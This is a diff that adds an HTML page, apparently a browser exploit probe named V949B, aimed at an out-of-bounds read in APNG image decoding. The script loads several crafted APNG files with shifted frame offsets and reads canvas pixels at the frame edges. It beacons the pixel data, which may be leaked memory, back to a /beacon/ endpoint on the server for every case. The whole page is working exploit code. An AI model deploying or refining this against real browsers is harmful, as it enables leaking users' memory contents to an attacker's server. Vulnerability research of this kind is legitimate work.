@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>V949B</title></head>
+<body><pre id="out">V949B — APNG OOB expand (offsets/stride, B)</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+function bk(tag,body){
+  try{new Image().src='/beacon/V949B-'+tag+'?d='+encodeURIComponent(String(body).slice(0,700))+'&t='+Date.now()+'&s=1';}catch(e){}
+}
+function hx(n){ var s=n.toString(16); return s.length<2?'0'+s:s; }
+function pxh(d,w,x,y){ var i=(y*w+x)*4; return hx(d[i])+hx(d[i+1])+hx(d[i+2])+hx(d[i+3]); }
+function loadImg(src){ return new Promise(function(res,rej){ var im=new Image(); im.onload=function(){res(im)}; im.onerror=function(){rej(new Error('load-fail'))}; im.src=src+'?cb='+Date.now()+'_'+Math.random(); }); }
+function scanRow(d,fw,y,xs){ var a=[]; for(var i=0;i<xs.length;i++){ var x=xs[i]; if(x>=0&&x<fw) a.push(x+':'+pxh(d,fw,x,y)); } return a.join(' '); }
+function range(a,b,step){ var r=[]; for(var x=a;x<=b;x+=step) r.push(x); return r; }
+async function run(c){
+  bk('T-PRE',c.n);
+  try{
+    var im=await loadImg(c.src);
+    var cv=document.createElement('canvas'); cv.width=c.fw; cv.height=c.fh;
+    var ctx=cv.getContext('2d'); ctx.clearRect(0,0,c.fw,c.fh); ctx.drawImage(im,0,0);
+    var d=ctx.getImageData(0,0,c.fw,c.fh).data;
+    var yo=c.yo||0, xo=c.xo||0, frW=c.frW, frH=c.frH;
+    // rows: yo, yo+frH-1 (if in frame band), yo+frH (just after)
+    var rows=[yo, Math.max(0,yo+Math.floor(frH/2)), Math.min(c.fh-1,yo+frH-1), Math.min(c.fh-1,yo+frH)];
+    var xs = range(0, Math.min(c.fw-1, Math.max(xo+frW+24, 40)), 1);
+    // focus edges: around xo, xo+frW, frW
+    var fx=[]; [0,xo,xo+frW,frW].forEach(function(e){ for(var k=e-2;k<=e+8;k++) if(k>=0&&k<c.fw) fx.push(k); });
+    fx = fx.filter(function(v,i,a){return a.indexOf(v)===i;}).sort(function(a,b){return a-b;});
+    for(var ri=0;ri<rows.length;ri++){
+      var y=rows[ri]; if(y<0||y>=c.fh) continue;
+      bk('R',c.n+'|y'+y+'|'+scanRow(d,c.fw,y,fx));
+    }
+    // wider sparse on yo
+    bk('W',c.n+'|y'+yo+'|wide|'+scanRow(d,c.fw,yo,range(0,Math.min(c.fw-1,63),2)));
+    say(c.n+' ok');
+  }catch(e){ bk('T-ERR',c.n+'|'+String(e&&e.message||e).slice(0,140)); say(c.n+' err'); }
+}
+(async function(){
+  bk('BOOT','offsets/stride expand');
+  var cases=[
+    {n:'x2_y0',src:'v949b_x2_y0.apng',fw:64,fh:64,frW:16,frH:16,xo:2,yo:0},
+    {n:'x8_y0',src:'v949b_x8_y0.apng',fw:64,fh:64,frW:16,frH:16,xo:8,yo:0},
+    {n:'x0_y8',src:'v949b_x0_y8.apng',fw:64,fh:64,frW:16,frH:8,xo:0,yo:8},
+    {n:'x8_y8',src:'v949b_x8_y8.apng',fw:64,fh:64,frW:16,frH:8,xo:8,yo:8},
+    {n:'f256',src:'v949b_f256_fr16.apng',fw:256,fh:64,frW:16,frH:16,xo:0,yo:0},
+    {n:'f128128',src:'v949b_f128128_fr16.apng',fw:128,fh:128,frW:16,frH:16,xo:0,yo:0}
+  ];
+  for(var i=0;i<cases.length;i++) await run(cases[i]);
+  bk('DONE','complete|note=check if OOB window moves/enlarges');
+  say('\nV949B complete.');
+})();
+</script>
+</body></html>
